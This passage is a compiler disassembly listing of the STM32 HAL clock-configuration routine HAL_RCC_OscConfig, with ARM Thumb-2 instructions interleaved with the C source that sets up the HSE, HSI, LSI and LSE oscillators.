 8003cf0:	d1f0      	bne.n	8003cd4 <HAL_RCC_OscConfig+0x1dc>
 8003cf2:	e000      	b.n	8003cf6 <HAL_RCC_OscConfig+0x1fe>
      if((READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U) && (RCC_OscInitStruct->MSIState == RCC_MSI_OFF))
 8003cf4:	bf00      	nop
        }
      }
    }
  }
  /*------------------------------- HSE Configuration ------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSE) == RCC_OSCILLATORTYPE_HSE)
 8003cf6:	687b      	ldr	r3, [r7, #4]
 8003cf8:	681b      	ldr	r3, [r3, #0]
 8003cfa:	f003 0301 	and.w	r3, r3, #1
 8003cfe:	2b00      	cmp	r3, #0
 8003d00:	d073      	beq.n	8003dea <HAL_RCC_OscConfig+0x2f2>
  {
    /* Check the parameters */
    assert_param(IS_RCC_HSE(RCC_OscInitStruct->HSEState));

    /* When the HSE is used as system clock or clock source for PLL in these cases it is not allowed to be disabled */
    if((sysclk_source == RCC_CFGR_SWS_HSE) ||
 8003d02:	69bb      	ldr	r3, [r7, #24]
 8003d04:	2b08      	cmp	r3, #8
 8003d06:	d005      	beq.n	8003d14 <HAL_RCC_OscConfig+0x21c>
 8003d08:	69bb      	ldr	r3, [r7, #24]
 8003d0a:	2b0c      	cmp	r3, #12
 8003d0c:	d10e      	bne.n	8003d2c <HAL_RCC_OscConfig+0x234>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_HSE)))
 8003d0e:	697b      	ldr	r3, [r7, #20]
 8003d10:	2b03      	cmp	r3, #3
 8003d12:	d10b      	bne.n	8003d2c <HAL_RCC_OscConfig+0x234>
    {
      if((READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U) && (RCC_OscInitStruct->HSEState == RCC_HSE_OFF))
 8003d14:	4b14      	ldr	r3, [pc, #80]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003d16:	681b      	ldr	r3, [r3, #0]
 8003d18:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003d1c:	2b00      	cmp	r3, #0
 8003d1e:	d063      	beq.n	8003de8 <HAL_RCC_OscConfig+0x2f0>
 8003d20:	687b      	ldr	r3, [r7, #4]
 8003d22:	685b      	ldr	r3, [r3, #4]
 8003d24:	2b00      	cmp	r3, #0
 8003d26:	d15f      	bne.n	8003de8 <HAL_RCC_OscConfig+0x2f0>
      {
        return HAL_ERROR;
 8003d28:	2301      	movs	r3, #1
 8003d2a:	e2f1      	b.n	8004310 <HAL_RCC_OscConfig+0x818>
      }
    }
    else
    {
      /* Set the new HSE configuration ---------------------------------------*/
      __HAL_RCC_HSE_CONFIG(RCC_OscInitStruct->HSEState);
 8003d2c:	687b      	ldr	r3, [r7, #4]
 8003d2e:	685b      	ldr	r3, [r3, #4]
 8003d30:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8003d34:	d106      	bne.n	8003d44 <HAL_RCC_OscConfig+0x24c>
 8003d36:	4b0c      	ldr	r3, [pc, #48]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003d38:	681b      	ldr	r3, [r3, #0]
 8003d3a:	4a0b      	ldr	r2, [pc, #44]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003d3c:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8003d40:	6013      	str	r3, [r2, #0]
 8003d42:	e025      	b.n	8003d90 <HAL_RCC_OscConfig+0x298>
 8003d44:	687b      	ldr	r3, [r7, #4]
 8003d46:	685b      	ldr	r3, [r3, #4]
 8003d48:	f5b3 2fa0 	cmp.w	r3, #327680	; 0x50000
 8003d4c:	d114      	bne.n	8003d78 <HAL_RCC_OscConfig+0x280>
 8003d4e:	4b06      	ldr	r3, [pc, #24]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003d50:	681b      	ldr	r3, [r3, #0]
 8003d52:	4a05      	ldr	r2, [pc, #20]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003d54:	f443 2380 	orr.w	r3, r3, #262144	; 0x40000
 8003d58:	6013      	str	r3, [r2, #0]
 8003d5a:	4b03      	ldr	r3, [pc, #12]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003d5c:	681b      	ldr	r3, [r3, #0]
 8003d5e:	4a02      	ldr	r2, [pc, #8]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003d60:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8003d64:	6013      	str	r3, [r2, #0]
 8003d66:	e013      	b.n	8003d90 <HAL_RCC_OscConfig+0x298>
 8003d68:	40021000 	.word	0x40021000
 8003d6c:	0800d474 	.word	0x0800d474
 8003d70:	20000000 	.word	0x20000000
 8003d74:	20000004 	.word	0x20000004
 8003d78:	4ba0      	ldr	r3, [pc, #640]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003d7a:	681b      	ldr	r3, [r3, #0]
 8003d7c:	4a9f      	ldr	r2, [pc, #636]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003d7e:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 8003d82:	6013      	str	r3, [r2, #0]
 8003d84:	4b9d      	ldr	r3, [pc, #628]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003d86:	681b      	ldr	r3, [r3, #0]
 8003d88:	4a9c      	ldr	r2, [pc, #624]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003d8a:	f423 2380 	bic.w	r3, r3, #262144	; 0x40000
 8003d8e:	6013      	str	r3, [r2, #0]

      /* Check the HSE State */
      if(RCC_OscInitStruct->HSEState != RCC_HSE_OFF)
 8003d90:	687b      	ldr	r3, [r7, #4]
 8003d92:	685b      	ldr	r3, [r3, #4]
 8003d94:	2b00      	cmp	r3, #0
 8003d96:	d013      	beq.n	8003dc0 <HAL_RCC_OscConfig+0x2c8>
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003d98:	f7fd fb2a 	bl	80013f0 <HAL_GetTick>
 8003d9c:	6138      	str	r0, [r7, #16]

        /* Wait till HSE is ready */
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 8003d9e:	e008      	b.n	8003db2 <HAL_RCC_OscConfig+0x2ba>
        {
          if((HAL_GetTick() - tickstart) > HSE_TIMEOUT_VALUE)
 8003da0:	f7fd fb26 	bl	80013f0 <HAL_GetTick>
 8003da4:	4602      	mov	r2, r0
 8003da6:	693b      	ldr	r3, [r7, #16]
 8003da8:	1ad3      	subs	r3, r2, r3
 8003daa:	2b64      	cmp	r3, #100	; 0x64
 8003dac:	d901      	bls.n	8003db2 <HAL_RCC_OscConfig+0x2ba>
          {
            return HAL_TIMEOUT;
 8003dae:	2303      	movs	r3, #3
 8003db0:	e2ae      	b.n	8004310 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 8003db2:	4b92      	ldr	r3, [pc, #584]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003db4:	681b      	ldr	r3, [r3, #0]
 8003db6:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003dba:	2b00      	cmp	r3, #0
 8003dbc:	d0f0      	beq.n	8003da0 <HAL_RCC_OscConfig+0x2a8>
 8003dbe:	e014      	b.n	8003dea <HAL_RCC_OscConfig+0x2f2>
        }
      }
      else
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003dc0:	f7fd fb16 	bl	80013f0 <HAL_GetTick>
 8003dc4:	6138      	str	r0, [r7, #16]

        /* Wait till HSE is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U)
 8003dc6:	e008      	b.n	8003dda <HAL_RCC_OscConfig+0x2e2>
        {
          if((HAL_GetTick() - tickstart) > HSE_TIMEOUT_VALUE)
 8003dc8:	f7fd fb12 	bl	80013f0 <HAL_GetTick>
 8003dcc:	4602      	mov	r2, r0
 8003dce:	693b      	ldr	r3, [r7, #16]
 8003dd0:	1ad3      	subs	r3, r2, r3
 8003dd2:	2b64      	cmp	r3, #100	; 0x64
 8003dd4:	d901      	bls.n	8003dda <HAL_RCC_OscConfig+0x2e2>
          {
            return HAL_TIMEOUT;
 8003dd6:	2303      	movs	r3, #3
 8003dd8:	e29a      	b.n	8004310 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U)
 8003dda:	4b88      	ldr	r3, [pc, #544]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003ddc:	681b      	ldr	r3, [r3, #0]
 8003dde:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003de2:	2b00      	cmp	r3, #0
 8003de4:	d1f0      	bne.n	8003dc8 <HAL_RCC_OscConfig+0x2d0>
 8003de6:	e000      	b.n	8003dea <HAL_RCC_OscConfig+0x2f2>
      if((READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U) && (RCC_OscInitStruct->HSEState == RCC_HSE_OFF))
 8003de8:	bf00      	nop
        }
      }
    }
  }
  /*----------------------------- HSI Configuration --------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSI) == RCC_OSCILLATORTYPE_HSI)
 8003dea:	687b      	ldr	r3, [r7, #4]
 8003dec:	681b      	ldr	r3, [r3, #0]
 8003dee:	f003 0302 	and.w	r3, r3, #2
 8003df2:	2b00      	cmp	r3, #0
 8003df4:	d060      	beq.n	8003eb8 <HAL_RCC_OscConfig+0x3c0>
    /* Check the parameters */
    assert_param(IS_RCC_HSI(RCC_OscInitStruct->HSIState));
    assert_param(IS_RCC_HSI_CALIBRATION_VALUE(RCC_OscInitStruct->HSICalibrationValue));

    /* Check if HSI is used as system clock or as PLL source when PLL is selected as system clock */
    if((sysclk_source == RCC_CFGR_SWS_HSI) ||
 8003df6:	69bb      	ldr	r3, [r7, #24]
 8003df8:	2b04      	cmp	r3, #4
 8003dfa:	d005      	beq.n	8003e08 <HAL_RCC_OscConfig+0x310>
 8003dfc:	69bb      	ldr	r3, [r7, #24]
 8003dfe:	2b0c      	cmp	r3, #12
 8003e00:	d119      	bne.n	8003e36 <HAL_RCC_OscConfig+0x33e>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_HSI)))
 8003e02:	697b      	ldr	r3, [r7, #20]
 8003e04:	2b02      	cmp	r3, #2
 8003e06:	d116      	bne.n	8003e36 <HAL_RCC_OscConfig+0x33e>
    {
      /* When HSI is used as system clock it will not be disabled */
      if((READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U) && (RCC_OscInitStruct->HSIState == RCC_HSI_OFF))
 8003e08:	4b7c      	ldr	r3, [pc, #496]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003e0a:	681b      	ldr	r3, [r3, #0]
 8003e0c:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003e10:	2b00      	cmp	r3, #0
 8003e12:	d005      	beq.n	8003e20 <HAL_RCC_OscConfig+0x328>
 8003e14:	687b      	ldr	r3, [r7, #4]
 8003e16:	68db      	ldr	r3, [r3, #12]
 8003e18:	2b00      	cmp	r3, #0
 8003e1a:	d101      	bne.n	8003e20 <HAL_RCC_OscConfig+0x328>
      {
        return HAL_ERROR;
 8003e1c:	2301      	movs	r3, #1
 8003e1e:	e277      	b.n	8004310 <HAL_RCC_OscConfig+0x818>
      }
      /* Otherwise, just the calibration is allowed */
      else
      {
        /* Adjusts the Internal High Speed oscillator (HSI) calibration value.*/
        __HAL_RCC_HSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->HSICalibrationValue);
 8003e20:	4b76      	ldr	r3, [pc, #472]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003e22:	685b      	ldr	r3, [r3, #4]
 8003e24:	f023 52f8 	bic.w	r2, r3, #520093696	; 0x1f000000
 8003e28:	687b      	ldr	r3, [r7, #4]
 8003e2a:	691b      	ldr	r3, [r3, #16]
 8003e2c:	061b      	lsls	r3, r3, #24
 8003e2e:	4973      	ldr	r1, [pc, #460]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003e30:	4313      	orrs	r3, r2
 8003e32:	604b      	str	r3, [r1, #4]
      if((READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U) && (RCC_OscInitStruct->HSIState == RCC_HSI_OFF))
 8003e34:	e040      	b.n	8003eb8 <HAL_RCC_OscConfig+0x3c0>
      }
    }
    else
    {
      /* Check the HSI State */
      if(RCC_OscInitStruct->HSIState != RCC_HSI_OFF)
 8003e36:	687b      	ldr	r3, [r7, #4]
 8003e38:	68db      	ldr	r3, [r3, #12]
 8003e3a:	2b00      	cmp	r3, #0
 8003e3c:	d023      	beq.n	8003e86 <HAL_RCC_OscConfig+0x38e>
      {
        /* Enable the Internal High Speed oscillator (HSI). */
        __HAL_RCC_HSI_ENABLE();
 8003e3e:	4b6f      	ldr	r3, [pc, #444]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003e40:	681b      	ldr	r3, [r3, #0]
 8003e42:	4a6e      	ldr	r2, [pc, #440]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003e44:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 8003e48:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003e4a:	f7fd fad1 	bl	80013f0 <HAL_GetTick>
 8003e4e:	6138      	str	r0, [r7, #16]

        /* Wait till HSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 8003e50:	e008      	b.n	8003e64 <HAL_RCC_OscConfig+0x36c>
        {
          if((HAL_GetTick() - tickstart) > HSI_TIMEOUT_VALUE)
 8003e52:	f7fd facd 	bl	80013f0 <HAL_GetTick>
 8003e56:	4602      	mov	r2, r0
 8003e58:	693b      	ldr	r3, [r7, #16]
 8003e5a:	1ad3      	subs	r3, r2, r3
 8003e5c:	2b02      	cmp	r3, #2
 8003e5e:	d901      	bls.n	8003e64 <HAL_RCC_OscConfig+0x36c>
          {
            return HAL_TIMEOUT;
 8003e60:	2303      	movs	r3, #3
 8003e62:	e255      	b.n	8004310 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 8003e64:	4b65      	ldr	r3, [pc, #404]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003e66:	681b      	ldr	r3, [r3, #0]
 8003e68:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003e6c:	2b00      	cmp	r3, #0
 8003e6e:	d0f0      	beq.n	8003e52 <HAL_RCC_OscConfig+0x35a>
          }
        }

        /* Adjusts the Internal High Speed oscillator (HSI) calibration value.*/
        __HAL_RCC_HSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->HSICalibrationValue);
 8003e70:	4b62      	ldr	r3, [pc, #392]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003e72:	685b      	ldr	r3, [r3, #4]
 8003e74:	f023 52f8 	bic.w	r2, r3, #520093696	; 0x1f000000
 8003e78:	687b      	ldr	r3, [r7, #4]
 8003e7a:	691b      	ldr	r3, [r3, #16]
 8003e7c:	061b      	lsls	r3, r3, #24
 8003e7e:	495f      	ldr	r1, [pc, #380]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003e80:	4313      	orrs	r3, r2
 8003e82:	604b      	str	r3, [r1, #4]
 8003e84:	e018      	b.n	8003eb8 <HAL_RCC_OscConfig+0x3c0>
      }
      else
      {
        /* Disable the Internal High Speed oscillator (HSI). */
        __HAL_RCC_HSI_DISABLE();
 8003e86:	4b5d      	ldr	r3, [pc, #372]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003e88:	681b      	ldr	r3, [r3, #0]
 8003e8a:	4a5c      	ldr	r2, [pc, #368]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003e8c:	f423 7380 	bic.w	r3, r3, #256	; 0x100
 8003e90:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003e92:	f7fd faad 	bl	80013f0 <HAL_GetTick>
 8003e96:	6138      	str	r0, [r7, #16]

        /* Wait till HSI is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U)
 8003e98:	e008      	b.n	8003eac <HAL_RCC_OscConfig+0x3b4>
        {
          if((HAL_GetTick() - tickstart) > HSI_TIMEOUT_VALUE)
 8003e9a:	f7fd faa9 	bl	80013f0 <HAL_GetTick>
 8003e9e:	4602      	mov	r2, r0
 8003ea0:	693b      	ldr	r3, [r7, #16]
 8003ea2:	1ad3      	subs	r3, r2, r3
 8003ea4:	2b02      	cmp	r3, #2
 8003ea6:	d901      	bls.n	8003eac <HAL_RCC_OscConfig+0x3b4>
          {
            return HAL_TIMEOUT;
 8003ea8:	2303      	movs	r3, #3
 8003eaa:	e231      	b.n	8004310 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U)
 8003eac:	4b53      	ldr	r3, [pc, #332]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003eae:	681b      	ldr	r3, [r3, #0]
 8003eb0:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003eb4:	2b00      	cmp	r3, #0
 8003eb6:	d1f0      	bne.n	8003e9a <HAL_RCC_OscConfig+0x3a2>
        }
      }
    }
  }
  /*------------------------------ LSI Configuration -------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_LSI) == RCC_OSCILLATORTYPE_LSI)
 8003eb8:	687b      	ldr	r3, [r7, #4]
 8003eba:	681b      	ldr	r3, [r3, #0]
 8003ebc:	f003 0308 	and.w	r3, r3, #8
 8003ec0:	2b00      	cmp	r3, #0
 8003ec2:	d03c      	beq.n	8003f3e <HAL_RCC_OscConfig+0x446>
  {
    /* Check the parameters */
    assert_param(IS_RCC_LSI(RCC_OscInitStruct->LSIState));

    /* Check the LSI State */
    if(RCC_OscInitStruct->LSIState != RCC_LSI_OFF)
 8003ec4:	687b      	ldr	r3, [r7, #4]
 8003ec6:	695b      	ldr	r3, [r3, #20]
 8003ec8:	2b00      	cmp	r3, #0
 8003eca:	d01c      	beq.n	8003f06 <HAL_RCC_OscConfig+0x40e>
        MODIFY_REG(RCC->CSR, RCC_CSR_LSIPREDIV, RCC_OscInitStruct->LSIDiv);
      }
#endif /* RCC_CSR_LSIPREDIV */

      /* Enable the Internal Low Speed oscillator (LSI). */
      __HAL_RCC_LSI_ENABLE();
 8003ecc:	4b4b      	ldr	r3, [pc, #300]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003ece:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003ed2:	4a4a      	ldr	r2, [pc, #296]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003ed4:	f043 0301 	orr.w	r3, r3, #1
 8003ed8:	f8c2 3094 	str.w	r3, [r2, #148]	; 0x94

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003edc:	f7fd fa88 	bl	80013f0 <HAL_GetTick>
 8003ee0:	6138      	str	r0, [r7, #16]

      /* Wait till LSI is ready */
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) == 0U)
 8003ee2:	e008      	b.n	8003ef6 <HAL_RCC_OscConfig+0x3fe>
      {
        if((HAL_GetTick() - tickstart) > LSI_TIMEOUT_VALUE)
 8003ee4:	f7fd fa84 	bl	80013f0 <HAL_GetTick>
 8003ee8:	4602      	mov	r2, r0
 8003eea:	693b      	ldr	r3, [r7, #16]
 8003eec:	1ad3      	subs	r3, r2, r3
 8003eee:	2b02      	cmp	r3, #2
 8003ef0:	d901      	bls.n	8003ef6 <HAL_RCC_OscConfig+0x3fe>
        {
          return HAL_TIMEOUT;
 8003ef2:	2303      	movs	r3, #3
 8003ef4:	e20c      	b.n	8004310 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) == 0U)
 8003ef6:	4b41      	ldr	r3, [pc, #260]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003ef8:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003efc:	f003 0302 	and.w	r3, r3, #2
 8003f00:	2b00      	cmp	r3, #0
 8003f02:	d0ef      	beq.n	8003ee4 <HAL_RCC_OscConfig+0x3ec>
 8003f04:	e01b      	b.n	8003f3e <HAL_RCC_OscConfig+0x446>
      }
    }
    else
    {
      /* Disable the Internal Low Speed oscillator (LSI). */
      __HAL_RCC_LSI_DISABLE();
 8003f06:	4b3d      	ldr	r3, [pc, #244]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003f08:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003f0c:	4a3b      	ldr	r2, [pc, #236]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003f0e:	f023 0301 	bic.w	r3, r3, #1
 8003f12:	f8c2 3094 	str.w	r3, [r2, #148]	; 0x94

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003f16:	f7fd fa6b 	bl	80013f0 <HAL_GetTick>
 8003f1a:	6138      	str	r0, [r7, #16]

      /* Wait till LSI is disabled */
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) != 0U)
 8003f1c:	e008      	b.n	8003f30 <HAL_RCC_OscConfig+0x438>
      {
        if((HAL_GetTick() - tickstart) > LSI_TIMEOUT_VALUE)
 8003f1e:	f7fd fa67 	bl	80013f0 <HAL_GetTick>
 8003f22:	4602      	mov	r2, r0
 8003f24:	693b      	ldr	r3, [r7, #16]
 8003f26:	1ad3      	subs	r3, r2, r3
 8003f28:	2b02      	cmp	r3, #2
 8003f2a:	d901      	bls.n	8003f30 <HAL_RCC_OscConfig+0x438>
        {
          return HAL_TIMEOUT;
 8003f2c:	2303      	movs	r3, #3
 8003f2e:	e1ef      	b.n	8004310 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) != 0U)
 8003f30:	4b32      	ldr	r3, [pc, #200]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003f32:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003f36:	f003 0302 	and.w	r3, r3, #2
 8003f3a:	2b00      	cmp	r3, #0
 8003f3c:	d1ef      	bne.n	8003f1e <HAL_RCC_OscConfig+0x426>
        }
      }
    }
  }
  /*------------------------------ LSE Configuration -------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_LSE) == RCC_OSCILLATORTYPE_LSE)
 8003f3e:	687b      	ldr	r3, [r7, #4]
 8003f40:	681b      	ldr	r3, [r3, #0]
 8003f42:	f003 0304 	and.w	r3, r3, #4
 8003f46:	2b00      	cmp	r3, #0
 8003f48:	f000 80a6 	beq.w	8004098 <HAL_RCC_OscConfig+0x5a0>
  {
    FlagStatus       pwrclkchanged = RESET;
 8003f4c:	2300      	movs	r3, #0
 8003f4e:	77fb      	strb	r3, [r7, #31]
    /* Check the parameters */
    assert_param(IS_RCC_LSE(RCC_OscInitStruct->LSEState));

    /* Update LSE configuration in Backup Domain control register    */
    /* Requires to enable write access to Backup Domain of necessary */
    if(HAL_IS_BIT_CLR(RCC->APB1ENR1, RCC_APB1ENR1_PWREN))
 8003f50:	4b2a      	ldr	r3, [pc, #168]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003f52:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003f54:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8003f58:	2b00      	cmp	r3, #0
 8003f5a:	d10d      	bne.n	8003f78 <HAL_RCC_OscConfig+0x480>
    {
      __HAL_RCC_PWR_CLK_ENABLE();
 8003f5c:	4b27      	ldr	r3, [pc, #156]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003f5e:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003f60:	4a26      	ldr	r2, [pc, #152]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003f62:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 8003f66:	6593      	str	r3, [r2, #88]	; 0x58
 8003f68:	4b24      	ldr	r3, [pc, #144]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003f6a:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003f6c:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8003f70:	60bb      	str	r3, [r7, #8]
 8003f72:	68bb      	ldr	r3, [r7, #8]
      pwrclkchanged = SET;
 8003f74:	2301      	movs	r3, #1
 8003f76:	77fb      	strb	r3, [r7, #31]
    }

    if(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003f78:	4b21      	ldr	r3, [pc, #132]	; (8004000 <HAL_RCC_OscConfig+0x508>)
 8003f7a:	681b      	ldr	r3, [r3, #0]
 8003f7c:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8003f80:	2b00      	cmp	r3, #0
 8003f82:	d118      	bne.n	8003fb6 <HAL_RCC_OscConfig+0x4be>
    {
      /* Enable write access to Backup domain */
      SET_BIT(PWR->CR1, PWR_CR1_DBP);
 8003f84:	4b1e      	ldr	r3, [pc, #120]	; (8004000 <HAL_RCC_OscConfig+0x508>)
 8003f86:	681b      	ldr	r3, [r3, #0]
 8003f88:	4a1d      	ldr	r2, [pc, #116]	; (8004000 <HAL_RCC_OscConfig+0x508>)
 8003f8a:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 8003f8e:	6013      	str	r3, [r2, #0]

      /* Wait for Backup domain Write protection disable */
      tickstart = HAL_GetTick();
 8003f90:	f7fd fa2e 	bl	80013f0 <HAL_GetTick>
 8003f94:	6138      	str	r0, [r7, #16]

      while(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003f96:	e008      	b.n	8003faa <HAL_RCC_OscConfig+0x4b2>
      {
        if((HAL_GetTick() - tickstart) > RCC_DBP_TIMEOUT_VALUE)
 8003f98:	f7fd fa2a 	bl	80013f0 <HAL_GetTick>
 8003f9c:	4602      	mov	r2, r0
 8003f9e:	693b      	ldr	r3, [r7, #16]
 8003fa0:	1ad3      	subs	r3, r2, r3
 8003fa2:	2b02      	cmp	r3, #2
 8003fa4:	d901      	bls.n	8003faa <HAL_RCC_OscConfig+0x4b2>
        {
          return HAL_TIMEOUT;
 8003fa6:	2303      	movs	r3, #3
 8003fa8:	e1b2      	b.n	8004310 <HAL_RCC_OscConfig+0x818>
      while(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003faa:	4b15      	ldr	r3, [pc, #84]	; (8004000 <HAL_RCC_OscConfig+0x508>)
 8003fac:	681b      	ldr	r3, [r3, #0]
 8003fae:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8003fb2:	2b00      	cmp	r3, #0
 8003fb4:	d0f0      	beq.n	8003f98 <HAL_RCC_OscConfig+0x4a0>
    {
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSEON);
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSEBYP);
    }
#else
    __HAL_RCC_LSE_CONFIG(RCC_OscInitStruct->LSEState);
 8003fb6:	687b      	ldr	r3, [r7, #4]
 8003fb8:	689b      	ldr	r3, [r3, #8]
 8003fba:	2b01      	cmp	r3, #1
 8003fbc:	d108      	bne.n	8003fd0 <HAL_RCC_OscConfig+0x4d8>
 8003fbe:	4b0f      	ldr	r3, [pc, #60]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003fc0:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003fc4:	4a0d      	ldr	r2, [pc, #52]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003fc6:	f043 0301 	orr.w	r3, r3, #1
 8003fca:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003fce:	e029      	b.n	8004024 <HAL_RCC_OscConfig+0x52c>
 8003fd0:	687b      	ldr	r3, [r7, #4]
 8003fd2:	689b      	ldr	r3, [r3, #8]
 8003fd4:	2b05      	cmp	r3, #5
 8003fd6:	d115      	bne.n	8004004 <HAL_RCC_OscConfig+0x50c>
 8003fd8:	4b08      	ldr	r3, [pc, #32]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003fda:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003fde:	4a07      	ldr	r2, [pc, #28]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003fe0:	f043 0304 	orr.w	r3, r3, #4
 8003fe4:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003fe8:	4b04      	ldr	r3, [pc, #16]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003fea:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003fee:	4a03      	ldr	r2, [pc, #12]	; (8003ffc <HAL_RCC_OscConfig+0x504>)
 8003ff0:	f043 0301 	orr.w	r3, r3, #1
 8003ff4:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003ff8:	e014      	b.n	8004024 <HAL_RCC_OscConfig+0x52c>
 8003ffa:	bf00      	nop
 8003ffc:	40021000 	.word	0x40021000
 8004000:	40007000 	.word	0x40007000
 8004004:	4b9a      	ldr	r3, [pc, #616]	; (8004270 <HAL_RCC_OscConfig+0x778>)
 8004006:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 800400a:	4a99      	ldr	r2, [pc, #612]	; (8004270 <HAL_RCC_OscConfig+0x778>)
 800400c:	f023 0301 	bic.w	r3, r3, #1
